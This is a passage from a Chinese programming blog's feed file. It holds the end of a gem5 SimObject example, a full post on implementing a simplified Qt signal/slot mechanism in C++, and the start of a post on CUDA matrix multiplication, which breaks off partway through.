class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloObject</span> : <span class="hljs-keyword">public</span> SimObject &#123;<br>  <span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">processEvent</span><span class="hljs-params">()</span></span>;<br>    EventFunctionWrapper event;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">HelloObject</span>(HelloObjectParams *p);<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">startup</span><span class="hljs-params">()</span></span>;<br>&#125;;<br><br>HelloObject::<span class="hljs-built_in">HelloObject</span>(HelloObjectParams *params)<br>  : <span class="hljs-built_in">SimObject</span>(params), <span class="hljs-built_in">event</span>([<span class="hljs-keyword">this</span>]&#123;<span class="hljs-built_in">processEvent</span>();&#125;, <span class="hljs-built_in">name</span>()) &#123;<br>    <span class="hljs-built_in">DPRINTF</span>(Hello, <span class="hljs-string">&quot;Created the hello object\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HelloObject::startup</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">schedule</span>(event, <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cpp</tag>
      
      <tag>gem5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信号槽机制的简陋实现</title>
    <link href="/2021/11/15/2021-11-15-Qt-signal-slot/"/>
    <url>/2021/11/15/2021-11-15-Qt-signal-slot/</url>
    
    <content type="html"><![CDATA[<h1>Qt 信号槽机制的简陋实现</h1><p>最近科研中碰到了一个需要实现信号触发机制的场景。我第一时间想到了 Qt 的信号槽机制。但可惜服务器上没有 Qt 的相关环境，因此需要自己实现一个简陋的信号触发机制。</p><h2 id="问题需求">问题需求</h2><p>假设 A 类的对象 a 与 B 类的对象 b 需要信号连接。即 a 发出某个信号 S 给 b ，b 接收到该信号后，根据自己所处的状态，决定是否响应该信号，响应即调用成员函数 <code>slot()</code>，不响应即让信号进入等待队列。</p><p>具体来说，在构造了对象 a 和 b 后，先使用 <code>connect()</code> 函数连接这两个对象。此后，在程序中任何位置中调用了 <code>a-&gt;signal()</code> 函数后，就视为对象 a 发出了信号 signal 给 b。此时，若 b 繁忙，那么该信号会暂时等待，直至空闲后 b 再调用成员函数 <code>slot()</code>，若 b 空闲，直接调用成员函数 <code>slot()</code>。与 Qt 机制相同，一个槽函数可以被多个信号相连接，一个信号也可以连接多个槽。</p><h2 id="naive-版本">naive 版本</h2><p>看到上述需求，我的第一反应是需要建立一个 Connection 类来帮助管理所有的连接。具体来说，在 <code>connect()</code> 函数中需要构造 Connection 类对象 c ，它一方面手握 b 的成员函数，另一方面与 a 的信号挂钩，从而实现信号触发机制。</p><p><img src="/img/connect.png" alt="Conection类中关于成员的探讨"></p><p>因此，Connection 类的定义有：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Connection</span> &#123;<br>    <span class="hljs-comment">// callback func and itself</span><br>    function&lt;<span class="hljs-type">void</span>()&gt; m;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">callback</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (m)<br>            <span class="hljs-built_in">m</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">A::signal</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (c)<br>        c-&gt;<span class="hljs-built_in">callback</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>对于 <code>connect()</code> 函数，过程就比较简单。构建Connection 类对象后，b 的成员函数传给Connection类中的“函数指针”，另一方面，需要将 a 发出的信号与该函数指针关联起来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">connect</span><span class="hljs-params">(A* a, B* b, string signal, string slot)</span> </span>&#123;<br>    Connection *c = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Connection</span>();<br>    function&lt;<span class="hljs-type">void</span>()&gt; f = <span class="hljs-built_in">bind</span>(&amp;B::slot, b);<br>    c-&gt;f = f;<br>    a-&gt;c = &amp;c;<br>&#125;<br></code></pre></td></tr></table></figure><p>关联的方案和 Qt 一样，选择使用字符串匹配的方式。即传入的参数使用宏定义包装，转为字符串。但这里的实现显然还<strong>没有用上函数后面的两个参数</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIGNAL(x) <span class="hljs-string">&quot;1&quot;</span>#x</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SLOT(x) <span class="hljs-string">&quot;2&quot;</span>#x</span><br><br>A *a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">A</span>();<br>B *b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">B</span>();<br><span class="hljs-built_in">connect</span>(a, b, <span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">signal1</span>()), <span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">slot</span>()))<br></code></pre></td></tr></table></figure><h2 id="逐步改进">逐步改进</h2><h3 id="响应函数队列">响应函数队列</h3><p>上述做法很简单，但缺点很多，先是没有使用 <code>connect()</code> 传入的信号和槽，然后是无法支持一个信号对应多个槽函数和多个信号，最后，槽函数的类型被限制为 <code>function&lt;void()&gt;</code> ，这也让人很难受。但总的来说，naive 版本起码说明了，这条路可行。</p><p>要想做的更好，需要加上很多东西。首先，对于每个信号，都应该有一个信号槽函数的队列。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>    map&lt;string, vector&lt;Connection *&gt;&gt; connect_map;<br><br>    <span class="hljs-comment">// for all slots connected with signal</span><br>    <span class="hljs-comment">// must callback at once</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">A::signal</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> conn : connect_map[<span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">signal</span>())])<br>            conn-&gt;<span class="hljs-built_in">callback</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">A::setUp</span><span class="hljs-params">(string signal, Connection *c)</span> </span>&#123;<br>        connect_map[signal].<span class="hljs-built_in">push_back</span>(c);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如此，当信号被调用后（发出后），所有与信号相连的槽函数都会被调用。</p><h3 id="信号槽函数的抽象">信号槽函数的抽象</h3><p>接下来解决下一个问题：如何使用 <code>connect()</code> 传来的槽函数，而不是硬编码到函数内部。有两个思路：一种是直接将 <code>connect()</code> 的参数类型改为函数指针，因为指针可以直接传入 Connection 类，可方便后续处理，但这会限制槽函数的类型。另一种是仍沿用字符串，但要求内部需要有一个对应表，存放字符串与槽函数的对应关系。参考 Qt 的信号槽机制，我选择使用第二种。</p><p>为了让所有类型的函数都可以充当槽函数，又不更改 Connection 类中的变量类型，可以选择<strong>抽象包装法</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Slot</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">switch</span> (func_id) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">slot1</span>();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-comment">// case 1:</span><br>        <span class="hljs-comment">// another slot()</span><br>        <span class="hljs-comment">// break;</span><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接将上面的 <code>Slot()</code> 函数传给 Connection 类，然后，让对象内的变量通过字符串来确定到底该调用哪一个成员函数。相当于在所有槽函数之上都加了一层抽象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> &#123;<br>    map&lt;string, <span class="hljs-type">int</span>&gt; funcMap;<br>    <span class="hljs-built_in">B</span>() &#123;<br>        funcMap.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">pair</span>&lt;string, <span class="hljs-type">int</span>&gt;(<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">slot1</span>()), <span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">findFuncId</span><span class="hljs-params">(string slot)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (funcMap.<span class="hljs-built_in">find</span>(slot) != funcMap.<span class="hljs-built_in">end</span>())<br>            func_id = funcMap[slot];<br>        <span class="hljs-keyword">else</span> <br>            func_id = <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>findFuncId()</code> 将字符串转为内部的函数编号，进而改变了 <code>Slot()</code> 函数要调用的槽函数，但需要我们提取把槽函数和编码都放到表中。为了统一，在信号发送端，我们也希望用整数取代字符串，来唯一编号信号函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>    map&lt;string, <span class="hljs-type">int</span>&gt; sgMap;<br>    <span class="hljs-built_in">A</span>() &#123;<br>        sgMap.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">pair</span>&lt;string, <span class="hljs-type">int</span>&gt;(<span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">signal1</span>()), <span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findSetId</span><span class="hljs-params">(string slot)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (sgMap.<span class="hljs-built_in">find</span>(slot) != sgMap.<span class="hljs-built_in">end</span>())<br>            signal_id = sgMap[slot];<br>        <span class="hljs-keyword">else</span> <br>            signal_id = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">return</span> signal_id;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从上面的改进中，可以看出不论槽函数是什么样，在 Connection 类中的函数指针永远指向 <code>Slot()</code>。对于 Connection 类而言，只需要记住哪个信号发生后（即信号的编码），需要触发哪些对象的哪些槽函数（即对应对象的槽函数编号）就行了。</p><p><img src="/img/connect2.png" alt=""></p><h3 id="Object-类">Object 类</h3><p>不难看到，A 类和 B 类在有些地方有相似性，可将其抽象出来成为一个基类 Object。另一方面，Object 类也可以替代 Connection 类的功能。所以，需要在这个地方做一个非常大的改动。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Old Connection</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Connection</span> &#123;<br>    <span class="hljs-comment">// callback func and itself</span><br>    function&lt;<span class="hljs-type">void</span>()&gt; m;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">callback</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (m)<br>            <span class="hljs-built_in">m</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">// Now Connection</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Connection</span> &#123;<br>    <span class="hljs-type">int</span> id;<br>    Object* receiver;<br>&#125;;<br></code></pre></td></tr></table></figure><p>首先，将 Connection 类做了改变，因为只需要槽函数的编号和类的抽象包装函数即可。</p><p>A 类和 B 类中，都有对信号/槽函数的编码表，那么编码表可以放在 Object 类中，取名为 <code>funcMap</code>，提供函数名字符串返回其编码。</p><p>此外，将之前 A 类中的 <code>map&lt;string, vector&lt;Connection *&gt;&gt; connect_map</code> 信号与对应槽函数的对应表关系也放入 Object 类中。把 B 类的抽象槽函数 <code>Slot()</code> 也放进 Object 类。如此，只要继承了 Object 类，再稍加修改（后续介绍），就可以使用我们自己实现的信号槽机制，与 Qt 的非常类似。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Object</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    map&lt;<span class="hljs-type">int</span>, vector&lt;Connection&gt;&gt; connect_map;<br>    map&lt;string, <span class="hljs-type">int</span>&gt; funcMap;<br>    function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>)&gt; Slot_;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后，在 Object 类中添加之前的函数实现，包括 <code>connect()</code> 函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Object</span> &#123;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">activate</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> c : connect_map[id])<br>            c.receiver-&gt;<span class="hljs-built_in">Slot_</span>(c.id);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findId</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> func_id = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">if</span> (funcMap.<span class="hljs-built_in">find</span>(s) != funcMap.<span class="hljs-built_in">end</span>())<br>            func_id = funcMap[s];<br>        <span class="hljs-keyword">return</span> func_id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">connect</span><span class="hljs-params">(Object *sender, Object *receiver,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">const</span> <span class="hljs-type">char</span>* signal, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* slot)</span> </span>&#123;<br>        <span class="hljs-type">int</span> sid = sender-&gt;<span class="hljs-built_in">findId</span>(signal);<br>        <span class="hljs-type">int</span> rid = receiver-&gt;<span class="hljs-built_in">findId</span>(slot);<br>        <span class="hljs-function">Connection <span class="hljs-title">c</span><span class="hljs-params">(rid, recevier)</span></span>;<br>        sender-&gt;connect_map[sid].<span class="hljs-built_in">push_back</span>(c);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>A 类和 B 类都直接继承 Object 类。但这样做还不够，需要在各自的构造函数中把自己的信号/槽函数加入 <code>funcMap</code> 中，槽函数也需要被动态绑定：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> : <span class="hljs-keyword">public</span> Object &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">A</span>() &#123;<br>        funcMap.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">pair</span>&lt;string, <span class="hljs-type">int</span>&gt;(<span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">signal1</span>()), <span class="hljs-number">0</span>));<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> : <span class="hljs-keyword">public</span> Object &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">B</span>() &#123;<br>        Slot_ = <span class="hljs-built_in">bind</span>(&amp;B::Slot, <span class="hljs-keyword">this</span>, placeholders::_1);<br>        funcMap.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">pair</span>&lt;string, <span class="hljs-type">int</span>&gt;(<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">slot1</span>()), <span class="hljs-number">0</span>));<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这样改动的好处是，要添加一个槽函数，我们无需更改 Object 类的部分，只需要更改 B 类的构造函数和 <code>Slot()</code>。新添加一个信号也是如此。</p><h3 id="带参数的信号槽">带参数的信号槽</h3><p>最后的改动，以支持某一些简单的参数可以在信号中传递。首先，在 Object 类中的槽函数，添加一个 <code>void**</code> 的变量，用于传参。随之改动的，就是 <code>activate()</code> 。<code>void **</code> 相当于一个指向所有参数的指针数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Object</span> &#123;<br>    function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>, <span class="hljs-type">void</span>**)&gt; Slot_;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">activate</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span> **arg)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> c : connect_map[id]) &#123;<br>            c.receiver-&gt;<span class="hljs-built_in">Slot_</span>(c.id, arg);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 A 类和 B 类中，为了与 Object 类一致，做如下修改：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> &#123;<br>    <span class="hljs-built_in">B</span>() &#123;<br>        Slot_ = <span class="hljs-built_in">bind</span>(&amp;B::Slot, <span class="hljs-keyword">this</span>, placeholders::_1, placeholders::_2);<br>        <span class="hljs-comment">// ....</span><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Slot</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span> **args)</span> </span>&#123;<br>        <span class="hljs-keyword">switch</span> (id) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">slot1</span>(*<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">int</span>*&gt;(args[<span class="hljs-number">0</span>]));<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">slot1</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;Slot : &quot;</span> &lt;&lt; a &lt;&lt; endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// In Class A</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">signal1</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> </span>&#123;<br>        <span class="hljs-type">void</span> *arg[] = &#123;<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">void</span>*&gt;(&amp;a)&#125;;<br>        <span class="hljs-built_in">activate</span>(<span class="hljs-number">0</span>, arg);<br>    &#125;<br></code></pre></td></tr></table></figure><p>信号函数中的多个参数，需要为它们一一构建好 <code>void*</code> 指针。在 <code>Slot()</code> 中，再将它们一一拆解开。</p><h2 id="小结">小结</h2><p>通过自己不断思考尝试，实现了 Qt 信号槽机制的简陋版。在失去了 MOC 机制后，编写自己的槽机制会有点丑陋，并且有很多地方需要改进，先勉强用上吧。</p>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Qt</tag>
      
      <tag>Cpp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>长文介绍矩阵乘法——从自己手搓到CUTLASS实现</title>
    <link href="/2021/10/20/2021-10-20-cuda-with-matmul/"/>
    <url>/2021/10/20/2021-10-20-cuda-with-matmul/</url>
    
    <content type="html"><![CDATA[<p>矩阵乘中很多计算步骤都十分相似且数据依赖不复杂，所以特别适合使用 GPU 来计算, 利用 GPU 内部的高度并行性，可极大地提高计算速度。使用 CUDA 完成矩阵乘法是一件非常有意义也有难度的事情。本篇博客从最简单最原始的实现出发，一步步地针对 CUDA 核函数进行优化，探讨 CUDA 矩阵乘中的优化与实现细节，并尝试总结出一般性原则，最后，我们粗略介绍了 cutlass 的矩阵乘步骤。</p><h2 id="矩阵乘法-CPU-实现">矩阵乘法 CPU 实现</h2><p>先看看在 CPU 下如何实现矩阵乘法，如我们在线性代数课上学的计算方式一样，代码逻辑非常简单，直接给出如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">matMulCpu</span><span class="hljs-params">(<span class="hljs-type">float</span>* c, <span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-type">float</span> sum = <span class="hljs-number">0.0f</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l = <span class="hljs-number">0</span>; l &lt; k; l++) &#123;<br>                sum += a[i * k + l] * b[l * n + j];<br>            &#125;<br>            c[i * n + j] = sum;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mrow><mi>m</mi><mo>×</mo><mi>k</mi></mrow></msub><mo>⋅</mo><msub><mi>B</mi><mrow><mi>k</mi><mo>×</mo><mi>n</mi></mrow></msub><mo>=</mo><msub><mi>C</mi><mrow><mi>m</mi><mo>×</mo><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">A_{m\times k} \cdot B_{k\times n} = C_{m\times n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2583em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span> 而言：</p><ul><li>计算次数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>×</mo><mi>n</mi><mo>×</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">m\times n\times k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" 